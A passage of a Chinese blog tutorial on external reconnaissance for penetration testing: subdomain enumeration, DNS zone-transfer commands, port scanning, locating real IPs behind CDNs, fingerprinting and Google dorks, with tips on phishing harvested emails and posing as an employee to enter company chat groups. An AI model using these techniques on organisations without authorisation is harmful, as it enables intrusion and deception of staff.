class="line">https://nmap.org/nsedoc/scripts/targets-asn.html</span><br><span class="line">$ nmap --script targets-asn --script-args targets-asn.asn=45090 &gt; netblocks.txt</span><br></pre></td></tr></table></figure></li></ul><p><strong>前端</strong></p><p>爬URL crossdomain.xml</p><p><strong>字典爆破</strong></p><p>DNSRecon</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python dnsrecon.py -n ns1.insecuredns.com –d insecuredns.com -D subdomains-top1mil-5000.txt -t brt</span><br></pre></td></tr></table></figure><p><a href="https://www.webshell.cc/6384.html" target="_blank" rel="noopener">layer子域名挖掘机</a></p><p>除了字典爆破，还可以进行扫描端口和探测服务器类型</p><p><a href="https://phpinfo.me/domain/" target="_blank" rel="noopener">https://phpinfo.me/domain/</a></p><p>这是Lcy大佬的在线子域名爆破工具    </p><p><a href="https://github.com/lijiejie/subDomainsBrute" target="_blank" rel="noopener">subDomainsBrute</a> - 是一个纯粹的子域名爆破脚本。基于字典，扫描速度快，支持多线程。 </p><p>Subdomainbrute（子域名爆破工具）通过字典去探测子域名，依赖dnspython插件 pip install dnspython</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python Subdomainbrute.py baidu.com</span><br></pre></td></tr></table></figure><p><a href="http://www.7kb.org/wp-content/uploads/2016/07/7kbscan-domain-gather-V2.6.zip" target="_blank" rel="noopener">7kbscan domain gather</a></p><p><a href="https://github.com/ring04h/wydomain" target="_blank" rel="noopener">wydomain猪猪侠</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python dnsburte.py -d domain</span><br></pre></td></tr></table></figure><p><a href="https://github.com/TheRook/subbrute" target="_blank" rel="noopener">SubBrute</a> - 是一个开源项目，DNS爬虫，能够使用字典爆破子域名，也是一个python库。 </p><p><a href="https://github.com/aboul3la/Sublist3r" target="_blank" rel="noopener">Sublist3r</a> - 是一个开源项目，整合了SubBrute，并且能够在网上收集公开的域名数据。 </p><p>Sublist3r会列举出使用Google、Yahoo、Bing、Baidu和Ask等搜索引擎查找到的子域名。Sublist3r还会列举使用Netcraft、Virustotal、ThreatCrowd、DNSdumpster和ReverseDNS查找到的子域名。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python .\sublist3r.py -d ichunqiu.com</span><br></pre></td></tr></table></figure><p>theHarvester（DNS、社会工程学工具、被动）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">theharvester -d ichunqiu.com -l 100 -b bing</span><br></pre></td></tr></table></figure><p><a href="https://github.com/Threezh1/JSFinder" target="_blank" rel="noopener">JSFinder</a>获取URL和子域名的方式</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">python3 JSFinder.py -u https://www.x.com/</span><br><span class="line">python3 JSFinder.py -u https://www.x.com/ -d -ou jd_url.txt -os jd_domain.txt</span><br><span class="line">#-d 深度爬取 -ou 保存URL -os 保存domain</span><br><span class="line">python JSFinder.py -f text.txt#指定URL</span><br><span class="line">python JSFinder.py -f text.txt -j#指定JS</span><br></pre></td></tr></table></figure><p><a href="https://github.com/appsecco/bugcrowd-levelup-subdomain-enumeration" target="_blank" rel="noopener">bugcrowd-levelup-subdomain-enumeration</a> - Bharath在Bugcrowd Levelup的议题用到的工具，包含子域名枚举脚本、CTlog查询脚本。 </p><p><a href="https://github.com/darkoperator/dnsrecon" target="_blank" rel="noopener">DNSrecon</a> - DNS枚举脚本 <a href="https://github.com/davidpepper/fierce-domain-scanner" target="_blank" rel="noopener">Fierce.pl Domain Scanner</a> - perl写的子域名爆破脚本 </p><p><a href="https://github.com/michenriksen/aquatone" target="_blank" rel="noopener">AQUATONE</a> - 一款强大的域名工具，可以查子域名相同指纹站点。 <a href="https://github.com/laramies/theHarvester" target="_blank" rel="noopener">theHarvester</a> - 一款社会工程学工具，有查询子域名的功能。</p><p><a href="https://github.com/blechschmidt/massdns.git" target="_blank" rel="noopener">MassDNS</a> - 一款域名解析工具，可以用于爆破子域名。 </p><p><a href="https://github.com/infosec-au/altdns" target="_blank" rel="noopener">Alt-DNS</a> - 根据已知域名排列或关键词生成字典来爆破子域名。 </p><p><a href="https://github.com/jhaddix/domain" target="_blank" rel="noopener">无名的，基于recon-ng和Alt-DNS的域名爆破脚本</a> </p><p><a href="https://github.com/eldraco/domain_analyzer" target="_blank" rel="noopener">Domain Analyzer</a> - 一个分析域名的工具，可以用来查子域名 </p><p><a href="https://github.com/jfrancois/SDBF" target="_blank" rel="noopener">Smart DNS Brute Forcer</a> - 卢森堡大学的学术型工具，结合Markov chain Models生成域名。 </p><p><a href="https://github.com/evilsocket/xray" target="_blank" rel="noopener">XRay</a> - 一款情报收集工具，有子域名收集功能 </p><p><a href="https://github.com/coco413/DiscoverSubdomain" target="_blank" rel="noopener">DiscoverSubdomain</a> - 自动化收集子域名工具，集成了多类子域名获取功能 </p><p><a href="https://github.com/franccesco/getaltname" target="_blank" rel="noopener">GetAltName</a> - 根据SAN获取其他域名 </p><p><a href="https://github.com/bit4woo/teemo.git" target="_blank" rel="noopener">Teemo</a> - 一款域名和邮箱的信息收集工具，挺全的，就是没SSL的收集路径 </p><p><a href="https://github.com/sawzeeyy/Sanitiz3r.git" target="_blank" rel="noopener">Sanitiz3r</a> - 中规中矩的域名爆破脚本，可以检测HTTP服务</p><p><strong>置换扫描</strong></p><p>Altdns使用已经已知的域名或子域名的排列、变更和突变来识别新的子域名。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python altdns.py -i icann.domains -o data_output -w icann.words -r -s results_output.txt</span><br></pre></td></tr></table></figure><p><strong>客户端接口</strong></p><p><strong>github等托管平台</strong></p><p><strong>NMap</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap --script dns-brute --script-args dns-brute.domain=target.com,dns-brute.threads=6,dns-brute.hostlist=dict.lst</span><br></pre></td></tr></table></figure><h3 id="备案信息"><a href="#备案信息" class="headerlink" title="备案信息"></a>备案信息</h3><p>ICP备案查询</p><p><a href="http://www.beian.miit.gov.cn/publish/query/indexFirst.action" target="_blank" rel="noopener">http://www.beian.miit.gov.cn/publish/query/indexFirst.action</a></p><p>公安部备案查询</p><p><a href="http://beian.gov.cn/portal/recordQuery" target="_blank" rel="noopener">http://beian.gov.cn/portal/recordQuery</a></p><h2 id="2-服务器信息"><a href="#2-服务器信息" class="headerlink" title="2. 服务器信息"></a>2. 服务器信息</h2><h3 id="DNS分析"><a href="#DNS分析" class="headerlink" title="DNS分析"></a>DNS分析</h3><p>通过查询DNS信息，我们可能可以发现网站的真实ip地址，也可以尝试测试是否存在DNS域传送漏洞。</p><p>查找某域名下所有主机和IP地址(子域名)</p><p>DNS记录类型</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">SOA授权管理该域的服务器</span><br><span class="line">NS名称解析服务器</span><br><span class="line">AIPv4地址</span><br><span class="line">AAAAAIPv6地址</span><br><span class="line">MX邮件服务器地址</span><br><span class="line">PTR逆向解析记录</span><br><span class="line">CNAME别名记录</span><br><span class="line">SRV提供的服务[优先级,权重,端口,实际提供服务的主机名]</span><br><span class="line">TXT</span><br></pre></td></tr></table></figure><p>nslookup</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nslookup example.com</span><br></pre></td></tr></table></figure><p>host</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">host example.com#默认A、AAAA、MX</span><br><span class="line">host -a example.com#默认查询的DNS服务器，在文件/etc/resolv.conf中</span><br><span class="line">host -a example.com8.8.8.8#指定查询的DNS服务器</span><br><span class="line">host -l example.comns4.isp.com#域传输（配置不当，概率较小）</span><br></pre></td></tr></table></figure><p>dig</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">dig example.com#默认A</span><br><span class="line">dig example.com any#全部类型的记录</span><br><span class="line">dig @ns4.isp.com example.com axfr#域传输</span><br></pre></td></tr></table></figure><p>dnsenum</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">dnsenum example.com#ip、NS、MX、自动尝试域传输</span><br><span class="line">dnsenum -f dns.txt example.com #暴力破解子域名</span><br><span class="line">dnsenum -p (page) -s (num) --threads 20 ichunqiu.com #没有成功</span><br></pre></td></tr></table></figure><p>dnsdict6(IPv6)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">dnsdict6 example.com</span><br><span class="line">dnsdict6 -d -4 example.com#IPv4、DNS、NS</span><br></pre></td></tr></table></figure><p>fierce</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fierce -dns example.com -threads 3#NS、域传输、字典爆破</span><br></pre></td></tr></table></figure><p>dmitry</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">dmitry -iwnse example.com#whois、google</span><br><span class="line">dmitry -p example.com -f -b#端口扫描(鸡肋)</span><br></pre></td></tr></table></figure><p>Sublist3r</p><p>Sublist3r会列举出使用Google、Yahoo、Bing、Baidu和Ask等搜索引擎查找到的子域名。Sublist3r还会列举使用Netcraft、Virustotal、ThreatCrowd、DNSdumpster和ReverseDNS查找到的子域名。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python .\sublist3r.py -d ichunqiu.com</span><br></pre></td></tr></table></figure><p>DNSRecon</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python dnsrecon.py -n ns1.insecuredns.com –d insecuredns.com -D subdomains-top1mil-5000.txt -t brt</span><br></pre></td></tr></table></figure><p>nmap</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap --script dns-brute --script-args dns-brute.domain=target.com,dns-brute.threads=6,dns-brute.hostlist=dict.lst</span><br></pre></td></tr></table></figure><p><strong>部分网站</strong></p><p><a href="https://www.virustotal.com/" target="_blank" rel="noopener">VirusTotal</a>是一个在线检测恶意样本或链接的网站，有自己的DNS数据集。</p><p><a href="https://dnsdumpster.com/" target="_blank" rel="noopener">DNSdumpster</a>是一个免费的域名分析网站，是HackerTarget旗下项目，可以查询相关的子域名或者旁站域名。</p><p><img src="/2019/06/24/信息收集(外网)/信息收集/1557753338673.png" alt="1557753338673"></p><p><a href="http://viewdns.info/" target="_blank" rel="noopener">ViewDNS</a>是一个DNS工具大全,可以查各种DNS信息。</p><p><strong>DNS域传递</strong></p><p>区域传送是DNS事务的一种类型，DNS服务器将一个完整或部分的区域文件副本传递给另一个DNS服务器。如果区域传送没有被安全地配置，任何人都可以在服务器上启动区域传送，并获得该区域文件的副本。而区域文件包含了许多关于该区域和驻留在该区域的主机的信息。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">dig +multi AXFR @ns1.insecuredns.com insecuredns.com</span><br><span class="line">dig AXFR@nameserver domain</span><br><span class="line">dnsenum domain</span><br><span class="line"></span><br><span class="line">nmap --script dns-zone-transfer --script-args dns-zone-trans</span><br><span class="line">fer.domain=nwpu.edu.cn -p 53 -Pn dns.nwpu.edu.cn</span><br></pre></td></tr></table></figure><h3 id="端口-amp-服务"><a href="#端口-amp-服务" class="headerlink" title="端口&amp;服务"></a>端口&amp;服务</h3><p><strong>Nmap</strong></p><p><strong>御剑高速端口扫描器</strong></p><p>masscan（扫描端口、服务）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">masscan -p1-200 192.168.11.1-192.168.11.20</span><br></pre></td></tr></table></figure><p>端口对应服务</p><p><img src="/2019/06/24/信息收集(外网)/信息收集/1559653838763.png" alt="1559653838763"></p><h3 id="真实IP"><a href="#真实IP" class="headerlink" title="真实IP"></a>真实IP</h3><p><strong>思路</strong></p><ol><li><p>二级域名法 一般网站不会所有的二级域名放CDN，因此我们可以利用这点来获取网站的真实ip </p></li><li><p>多地ping法 由CDN的原理，不同的地方去Ping服务器，如果IP不一样，则目标网站肯定使用了CDN</p></li><li><p>nslookup法 找国外的比较偏僻的DNS解析服务器进行DNS查询，因为大部分CDN提供商只针对国内市场，而对国外市场几乎是不做CDN，所以有很大的几率会直接解析到真实IP </p></li><li><p>查看邮件法 通过查看邮件原文来确定ip地址，CDN总不会发送邮件吧</p></li><li><p>RSS订阅法 RSS原理于邮件法差不多</p></li><li><p>查看历史解析记录法 查找域名历史解析记录，域名在上CDN之前用的IP，很有可能就是CDN的真实源IP地址</p><p><a href="https://dnsdb.io/zh-cn/" target="_blank" rel="noopener">https://dnsdb.io/zh-cn/</a><br><a href="https://x.threatbook.cn/" target="_blank" rel="noopener">https://x.threatbook.cn/</a><br>&lt;<a href="https://toolbar.netcraft.com/site_report?url" target="_blank" rel="noopener">https://toolbar.netcraft.com/site_report?url</a><br><a href="http://viewdns.info/" target="_blank" rel="noopener">http://viewdns.info/</a></p></li><li><p>插远程图片的方法，查看服务器的来源</p></li><li>利用网站漏洞（XSS、命令执行、SSRF、php探针、phpinfo页面等） 可以通过一些页面和漏洞获取到服务器ip地址也是可能的。</li></ol><p><strong>国外数据泄露收集与查询平台</strong></p><p><a href="https://haveibeenpwned.com/PwnedWebsites" target="_blank" rel="noopener">https://haveibeenpwned.com/PwnedWebsites</a><br><a href="https://canar.io/" target="_blank" rel="noopener">https://canar.io/</a><br><a href="http://breachalarm.com/" target="_blank" rel="noopener">http://breachalarm.com/</a><br><a href="https://pwnedlist.com/" target="_blank" rel="noopener">https://pwnedlist.com/</a><br><a href="https://archive.fbi.ninja/" target="_blank" rel="noopener">https://archive.fbi.ninja/</a><br><a href="https://cryptome.wikileaks.org/frontpage" target="_blank" rel="noopener">https://cryptome.wikileaks.org/frontpage</a><br><a href="https://cryptome.org/" target="_blank" rel="noopener">https://cryptome.org/</a><br><a href="http://databases.land/" target="_blank" rel="noopener">http://databases.land/</a><br><a href="https://vigilante.pw/" target="_blank" rel="noopener">https://vigilante.pw/</a></p><h3 id="路由信息"><a href="#路由信息" class="headerlink" title="路由信息"></a>路由信息</h3><p>traceroute(可能会被防火墙拦截)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">traceroute www.example.com</span><br></pre></td></tr></table></figure><p>tcptraceroute（探测开启的TCP端口不会被拦截）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tcptraceroute www.example.com</span><br></pre></td></tr></table></figure><p>tctrace</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tctrace -i eth0 -d www.example.com</span><br></pre></td></tr></table></figure><h3 id="系统类型-amp-版本"><a href="#系统类型-amp-版本" class="headerlink" title="系统类型&amp;版本"></a>系统类型&amp;版本</h3><p>windows大小写不敏感</p><p>banner信息</p><p>特殊端口服务</p><p>Nessus扫描</p><h2 id="3-Web应用信息"><a href="#3-Web应用信息" class="headerlink" title="3. Web应用信息"></a>3. Web应用信息</h2><h3 id="网站架构"><a href="#网站架构" class="headerlink" title="网站架构"></a>网站架构</h3><p><strong>操作系统&amp;中间件信息&amp;数据库&amp;编程语言</strong></p><p>Nmap </p><p>wappalyzer插件 </p><p>云悉</p><h3 id="指纹识别"><a href="#指纹识别" class="headerlink" title="指纹识别"></a>指纹识别</h3><p>指纹识别常见的检测对象：</p><ul><li>CMS（内容管理系统）信息<ul><li>dede织梦、wordpress、thinkphp、phpcms、thinkphp(框架)、ecshop、帝国、ezcms、Discuz、大汉CMS、魅力、海洋cms、逐浪cms Zoomla、drupal、EarCMS、思途CMS</li></ul></li><li>前端技术：<ul><li>HTML5、jquery、bootstrap、pure、ace、ajax等等</li></ul></li><li>中间件：apache、IIS、nginx、lighttpd、tomcat、weblogic、jboss、websphere 等等</li><li>开发语言：Java、PHP、Python、Ruby、Go、C# 等等</li><li>操作系统：Windows NT、类UNIX（macOS）</li><li>CDN信息：是否使用CDN<ul><li>常用cloudflare、360CDN、365cyd等等</li></ul></li><li>端口或者服务：</li><li>IP或者域名信息：</li><li>WAF：检测是否有WAF<ul><li>云盾、云锁、安全狗、IPS/IDS、等等</li></ul></li></ul><p>指纹识别方式：</p><ol><li><p>文件的MD5值（一对一）</p></li><li><p>关键词（robots.txt、powered by 、报错、URL、第三方插件等等）</p><ul><li>readme.txt、License.txt、help.txt等文件。</li><li>指定路径下指定图片文件，如一些小的图标文件，后台登录页面中的图标文件等，一般管理员不会修改它们。</li><li>404页面</li><li>302返回时的旗标</li></ul></li><li><p>响应头信息</p><ol><li>Server</li><li>X-Powered-By</li><li>Access-Control-Allow-Origin</li><li>WWW-Authenticate:判断网络设备</li></ol></li><li><p>URL中可能包含关键词（dede、wp-admin、wp-includes、slor、wls-wsat）</p></li><li><p>开发语言</p><ol><li>浏览器插件</li><li>Wappalyzer</li><li>URL识别</li><li>前端代码<ul><li>指定路径下指定名称的js文件或代码</li><li>指定路径下指定名称的css文件或代码</li><li><code>&lt;title&gt;</code>中的内容，有些程序标题中会带有程序标识</li><li>meta标记中带程序标识中带程序标识。</li><li>display:none中的版权信息。</li><li>页面底部版权信息，关键字© Powered by等。</li><li>注释掉的html代码中&lt;!–</li></ul></li><li>报错信息</li><li>respronse</li><li>set-cookie<ol><li>php  PHPSESSID</li><li>jsp  JSESSIONID</li><li>net  ASP.NET_SESSIONID</li></ol></li></ol></li><li><p>工具 </p><p>WhatWeb（识别网站类型）ruby apt install whatweb 2000+插件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">whatweb -v https://freebuf.com</span><br></pre></td></tr></table></figure><p>x-scan<br>nmap（端口、WAF、漏洞）<br>wpscan 使用Ruby开发，扫描Wordpress站点的漏洞以及插件漏洞</p><p>Plecost 用于探测wordpress的漏洞，可以直接给出当前站点的漏洞利用方法(CVE)<br>BlindElephant Web指纹识别工具<br>御剑web指纹识别程序（win）<br>Test404轻量WEB指纹识别（win）<br>w11scan分布式WEB指纹识别平台（docker 识别500+种类型）<br>Dayu指纹识别工具<br>WebEye<br>WTF_Scan<br>Webfinger</p></li><li><p>在线平台指纹识别</p><p>云悉指纹识别<a href="http://www.yunsee.cn/" target="_blank" rel="noopener">http://www.yunsee.cn/</a><br>bugscaner指纹识别<a href="http://whatweb.bugscaner.com/look/" target="_blank" rel="noopener">http://whatweb.bugscaner.com/look/</a><br>whatweb.net<a href="https://whatweb.net/" target="_blank" rel="noopener">https://whatweb.net/</a><br>TideFinger潮汐在线指纹识别<a href="http://finger.tidesec.net" target="_blank" rel="noopener">http://finger.tidesec.net</a></p></li></ol><h3 id="探测WAF"><a href="#探测WAF" class="headerlink" title="探测WAF"></a>探测WAF</h3><p>WAF也称Web应用防护系统，Web应用防火墙是通过执行一系列针对HTTP/HTTPS的安全策略来专门为Web应用提供保护的一款产品。</p><p>原理：WAF识别大多基于Headers头信息。通过发送恶意的内容，对比响应，寻找数据包被拦截、拒绝或者检测到的标识。</p><p><strong>检测方法</strong></p><p>先通过工具判断，如果工具检测到WAF的存在，再手工验证是否误报；如果工具检测不到WAF，再通过手工判断WAF是否存在。</p><ul><li><p>工具（WAFW00F、Nmap）</p><p>Nmap</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nmap -p80,443  --script=http-waf-detect 192.168.9.102</span><br><span class="line">nmap -p80,443  --script=http-waf-fingerprint 192.168.9.102</span><br></pre></td></tr></table></figure><p>waf00f探测WAF</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">waf00f -a www.example.com</span><br></pre></td></tr></table></figure></li><li><p>手工（提交恶意数据） </p><p>在网址URL参数后面输入恶意数据，通过提交后被WAF拦截得知WAF信息。</p></li></ul><h3 id="敏感目录及敏感信息、源码泄露（搜索引擎-工具）"><a href="#敏感目录及敏感信息、源码泄露（搜索引擎-工具）" class="headerlink" title="敏感目录及敏感信息、源码泄露（搜索引擎+工具）"></a>敏感目录及敏感信息、源码泄露（搜索引擎+工具）</h3><p>包括 子域名 用户名 密码 邮箱 源代码 等</p><ol><li><p>御剑</p><p>需要强大的字典，完善自己的字典</p></li><li><p><a href="https://mega.nz/#!pNFQ0JYT!AHFfiw76-A7KdpnvBUK6_9uPPbICg0Z4WqNkzjbAq00" target="_blank" rel="noopener">7kbscan-WebPathBrute 1.5.6 (集成三字典)(自行扶墙)</a></p></li><li><p>搜索引擎信息</p><p>国外</p><ul><li>Google</li><li>Bing</li><li>Yahoo</li></ul><p>国内</p><ul><li>baidu</li><li>haosou</li><li>sougou</li></ul><p>google基本语法</p><p>| 语法      | 功能                                                         |<br>| ——— | ———————————————————— |<br>| index of: | 直接进入到网站首页下的所有文件和文件夹中                     |<br>| intext:   | 查询网页正文中包含的关键词的网站                             |<br>| intitle:  | 返回网站标题中含有关键词的网站                               |<br>| cache:    | 搜索Google里关于某些内容缓存                                 |<br>| define:   | 查询某些词语的定义                                           |<br>| filetype: | 搜索指定类型的文件：doc、pdf、bak、zip、mdb、inc、config.inc |<br>| info:     | 查找指定站点的信息                                           |<br>| inurl:    | 在URL中寻找我们制定的关键信息 inurl:admin.php、login.php     |<br>| link:     | 返回所有和目标做了链接的URL                                  |<br>| site:     | 返回和目标有关（子域名）的所有URL                            |<br>| +         | 扩大搜索范围                                                 |<br>| -         | 忽略某些关键词                                               |<br>| |        | 或                                                           |<br>| ~         | 搜索同义词                                                   |<br>| .         | 单一的通配符  admi..php                                      |<br>| <em>         | 多个字符的通配符 admin</em>php                                   |<br>| “”        | 精准匹配                                                     |</p><p>搜索敏感文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">site:ooxx.com filetype:xls</span><br></pre></td></tr></table></figure><p>比如目标的某个系统手册演示的截图中截图到了用户名，然后我们可以根据用户名来爆破密码；甚至可以看看有没有写系统默认密码，或者一些后台的目录路径，如果有目录就可以尝试对其访问，说不定有未授权。</p><p>对后台进行查找</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">site:xxx.xxx admin</span><br><span class="line">site:xxx.xxx login </span><br><span class="line">site:xxx.xxx system</span><br><span class="line">site:xxx.xxx 管理</span><br><span class="line">site:xxx.xxx 登录 </span><br><span class="line">site:xxx.xxx 内部</span><br><span class="line">site:xxx.xxx 系统</span><br></pre></td></tr></table></figure><p>还可以查找邮箱，然后进行钓鱼：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">site:xxx.xxx 邮件</span><br><span class="line">site:xxx.xxx email</span><br></pre></td></tr></table></figure><p>还可以查找qq群等，然后假装员工验证进去看群文件泄露了什么东东（这里有个技巧，去找客服聊天处，然后对整个过程抓包也就是看历史请求，如果运气好可能在请求的返回包中返回客服的姓名，如果只单纯的泄露了姓如<strong>张xx</strong>，那么你加群的时候就说你是<strong>小张工作号</strong>，说这个工作号的原因是可能小张已经在群里了）。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">site:xxx.xxx qqsite:xxx.xxx 群site:xxx.xxx 企鹅site:xxx.xxx 腾讯</span><br></pre></td></tr></table></figure><p>还可以对寻找一些公开的、危害大、普遍的漏洞的指纹，如下面的搜索jboss系统：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">site:ooxx.com inurl:jmx-console</span><br></pre></td></tr></table></figure><p><strong>theharvester</strong></p><p>收集电子邮件账号、用户名、子域名信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">theharvester -d example.com -l 100 -b google</span><br><span class="line">theharvester -d example.com -l 100 -b linkedin</span><br></pre></td></tr></table></figure><p><strong>Metagooofil</strong></p><p>通过Google引擎搜索目标域的文件的元数据信息（metadata：doc, xls, ppt, pdf）</p><p>内部操作流程：</p><ul><li>使用Google引擎在目标域内搜索指定的文件类型</li><li>把搜索到的文档保存到本地磁盘</li><li>从下载文件中解析元数据信息</li><li>把元数据信息的分析结果保存为HTML文件</li></ul><p>元数据信息：</p><ul><li>用户名</li><li>软件版本</li><li>服务器名或主机名</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">metagoofil -d example.com -l 20 -t doc,pdf -n 5 -f test.html -o test</span><br><span class="line">-d 目标域, -t 文件类型 -o 保存目录 -l 每种文件收集个数 -n 下载个数 -f 分析报告</span><br></pre></td></tr></table></figure></li><li><p>github敏感信息</p><p><a href="https://github.com/repoog/GitPrey" target="_blank" rel="noopener">https://github.com/repoog/GitPrey</a> (GitHub敏感信息扫描工具)</p><p><a href="https://github.com/lijiejie/GitHack" target="_blank" rel="noopener">https://github.com/lijiejie/GitHack</a></p><p><a href="https://github.com/dxa4481/truffleHog" target="_blank" rel="noopener">https://github.com/dxa4481/truffleHog</a> (GitHub敏感信息扫描工具,包括检测commit等)</p><p><a href="https://github.com/0xbug/Hawkeye" target="_blank" rel="noopener">https://github.com/0xbug/Hawkeye</a> (企业资产GitHub泄露监控系统）</p><p><a href="https://github.com/lianfeng30/githubscan" target="_blank" rel="noopener">https://github.com/lianfeng30/githubscan</a> （根据企业关键词进行项目检索以及相应敏感文件和文件内容扫描的工具）</p></li><li><p>BBscan </p><p>BBscan是一款信息泄漏批量扫描脚本</p><p><a href="https://github.com/lijiejie/BBScan" target="_blank" rel="noopener">https://github.com/lijiejie/BBScan</a></p><p>在windows平台运行需要解决依赖问题</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pip install -r requirements.txt</span><br><span class="line">BBScan.py --full-scan --no-crawl --no-check404 -t2 -p50 -f iqiyi.http.txt</span><br></pre></td></tr></table></figure><p>使用示例</p><ol><li>扫描单个web服务 <a href="http://www.target.com" target="_blank" rel="noopener">www.target.com</a></li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python BBScan.py  --host www.target.com</span><br></pre></td></tr></table></figure><ol start="2"><li>扫描<a href="http://www.target.com和www.target.com/28下的其他主机" target="_blank" rel="noopener">www.target.com和www.target.com/28下的其他主机</a></li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python BBScan.py  --host www.target.com --network 28</span><br></pre></td></tr></table></figure><ol start="3"><li>扫描txt文件中的所有主机</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python BBScan.py -f wandoujia.com.txt</span><br></pre></td></tr></table></figure><ol start="4"><li>从文件夹中导入所有的主机并扫描</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python BBScan.py -d targets/  --browser</span><br></pre></td></tr></table></figure><ol start="5"><li>如果是为了去各大src刷漏洞，可以考虑把所有域名保存到targets文件夹下，然后</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python BBScan.py -d targets/ --network 30</span><br></pre></td></tr></table></figure></li><li><p>GSIL</p><p>GSIL是一款由python3写的从github上寻找敏感文件的安全工具。</p><p>项目地址：<a href="https://github.com/FeeiCN/GSIL" target="_blank" rel="noopener">https://github.com/FeeiCN/GSIL</a></p><p>安装依赖</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install -r requirements.txt</span><br></pre></td></tr></table></figure><p>然后需要给它进行配置</p><p><img src="/2019/06/24/信息收集(外网)/信息收集/640.webp" alt="img"></p><p>用法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span 